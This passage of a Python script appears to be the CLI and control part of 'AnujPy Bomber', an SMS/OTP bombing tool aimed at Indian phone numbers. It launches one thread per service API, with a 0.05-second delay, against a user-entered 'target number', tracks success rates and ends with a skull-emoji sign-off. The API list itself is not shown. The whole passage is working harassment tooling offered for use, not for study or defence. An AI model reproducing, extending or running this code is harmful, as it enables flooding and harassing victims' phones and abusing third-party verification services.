        self.stats = {"success": 0, "total": 0, "last_api": "", "last_status": ""}
        
        # Start threads for each API
        for api in APIS:
            t = BombingThread(api, phone, self.stats, self.lock, delay=0.05)
            t.daemon = True
            t.start()
            self.active_threads.append(t)
        
        # Handle timed mode
        if mode == "timed":
            def stop_after_duration():
                time.sleep(duration)
                self.stop()
            
            timer_thread = threading.Thread(target=stop_after_duration)
            timer_thread.daemon = True
            timer_thread.start()
        
        return {
            "status": "started", 
            "message": f"Bombing started on +91{phone}", 
            "apis": len(APIS), 
            "mode": mode,
            "threads": len(self.active_threads)
        }
    
    def stop(self) -> Dict:
        """Stop all bombing threads"""
        if not self.is_running:
            return {"error": "No active bombing session"}
        
        for thread in self.active_threads:
            thread.stop()
        
        self.active_threads.clear()
        self.is_running = False
        
        return {
            "status": "stopped",
            "stats": self.stats,
            "success_rate": (self.stats["success"] / self.stats["total"] * 100) if self.stats["total"] > 0 else 0
        }
    
    def get_stats(self) -> Dict:
        """Get current bombing statistics"""
        return {
            **self.stats,
            "is_running": self.is_running,
            "active_threads": len(self.active_threads)
        }
    
    @staticmethod
    def get_apis_count() -> int:
        """Get total number of available APIs"""
        return len(APIS)
    
    @staticmethod
    def get_apis_list() -> List[str]:
        """Get list of all API names"""
        return [api["name"] for api in APIS]
    
    @staticmethod
    def show_banner():
        """Show AnujPy Bomber Banner"""
        if CFONTS_AVAILABLE:
            try:
                banner = render('BOMBER', colors=['red', 'white'], align='center')
                print(banner)
            except:
                pass
        print(Fore.CYAN + "="*60)
        print(Fore.YELLOW + "   ANUJ PYTHON BOMBER v2.0")
        print(Fore.GREEN + f"   Total APIs: {len(APIS)}")
        print(Fore.CYAN + "="*60 + Fore.RESET)

# ============ CLI MAIN FUNCTION ============
def main():
    """CLI entry point for bomber"""
    bomber = Bomber()
    bomber.show_banner()
    
    phone_input = input(f"{Fore.GREEN}[+] Enter target number (+91): {Fore.RESET}")
    phone = bomber.validate_phone(phone_input)
    
    if not phone:
        print(Fore.RED + "[-] Invalid number! Use 10-digit Indian number starting with 6,7,8,9" + Fore.RESET)
        return
    
    print(Fore.GREEN + f"[+] Target: +91{phone}")
    print(Fore.YELLOW + f"[+] Total APIs: {len(APIS)}")
    print(Fore.RED + "[!] Press Ctrl+C to stop bombing" + Fore.RESET)
    print(Fore.CYAN + "="*60 + Fore.RESET)
    
    result = bomber.start(phone)
    if "error" in result:
        print(Fore.RED + f"[-] {result['error']}" + Fore.RESET)
        return
    
    # Stats display thread
    def show_stats():
        while bomber.is_running:
            stats = bomber.get_stats()
            sys.stdout.write(f"\r{Fore.YELLOW}[+] Success: {stats['success']} | Total: {stats['total']} | Rate: {(stats['success']/stats['total']*100) if stats['total']>0 else 0:.1f}% {Fore.RESET}")
            sys.stdout.flush()
            time.sleep(0.5)
    
    stats_thread = threading.Thread(target=show_stats)
    stats_thread.daemon = True
    stats_thread.start()
    
    try:
        while bomber.is_running:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n")
        result = bomber.stop()
        print(Fore.GREEN + f"[+] Stopped! Final Stats:" + Fore.RESET)
        print(Fore.CYAN + f"    ✓ Successful: {result['stats']['success']}")
        print(Fore.WHITE + f"    ✗ Total Attempts: {result['stats']['total']}")
        print(Fore.MAGENTA + f"    📈 Success Rate: {result['success_rate']:.1f}%")
        print(Fore.YELLOW + f"    🎯 Last API: {result['stats']['last_api']}")
        print(Fore.CYAN + "="*60)
        print(Fore.GREEN + "💀 Thanks for using AnujPy Bomber! - @PyAnuj" + Fore.RESET)

if __name__ == "__main__":
    main()
